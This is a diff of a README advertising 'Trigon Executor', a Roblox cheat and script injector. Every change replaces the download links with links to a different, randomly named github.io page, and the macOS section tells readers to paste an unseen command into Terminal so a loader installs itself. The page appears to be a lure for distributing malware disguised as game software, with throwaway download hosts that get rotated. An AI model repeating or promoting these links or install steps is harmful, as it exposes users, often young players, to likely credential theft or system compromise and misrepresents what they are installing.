@@ -10,8 +10,8 @@ Trigon Executor combines a 98% UNC score with a lightning-fast injection engine 
 
 <div align="center">
 
-[![Download Trigon Executor](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://WaterCongressman.github.io/win-download/)
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://WaterCongressman.github.io/mac-download/)
+[![Download Trigon Executor](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://iloqhmlhfppl.github.io/win-get2/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://iloqhmlhfppl.github.io/mac-download2/)
 
 </div>
 
@@ -41,14 +41,14 @@ Trigon Executor combines a 98% UNC score with a lightning-fast injection engine 
 4. **🎮 Join any Roblox game**
 5. **⚡ Click Inject** — load your script and Execute
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20TRIGON%20🔻-purple?style=for-the-badge&logo=github)](https://WaterCongressman.github.io/win-download/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20TRIGON%20🔻-purple?style=for-the-badge&logo=github)](https://iloqhmlhfppl.github.io/win-get2/)
 
 ### 🍎 macOS
 1. Press `⌘ + Space`, type **Terminal**, hit Enter
 2. Paste the command and press Enter
 3. Follow the prompts — the loader installs automatically
 
-[![Mac Download](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://WaterCongressman.github.io/mac-download/)
+[![Mac Download](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://iloqhmlhfppl.github.io/mac-download2/)
 
 ---
 
@@ -84,5 +84,5 @@ Trigon Executor combines a 98% UNC score with a lightning-fast injection engine 
 
 ---
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20TRIGON%20🔻-purple?style=for-the-badge&logo=github)](https://WaterCongressman.github.io/win-download/)
-[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://WaterCongressman.github.io/mac-download/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20TRIGON%20🔻-purple?style=for-the-badge&logo=github)](https://iloqhmlhfppl.github.io/win-get2/)
+[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://iloqhmlhfppl.github.io/mac-download2/)
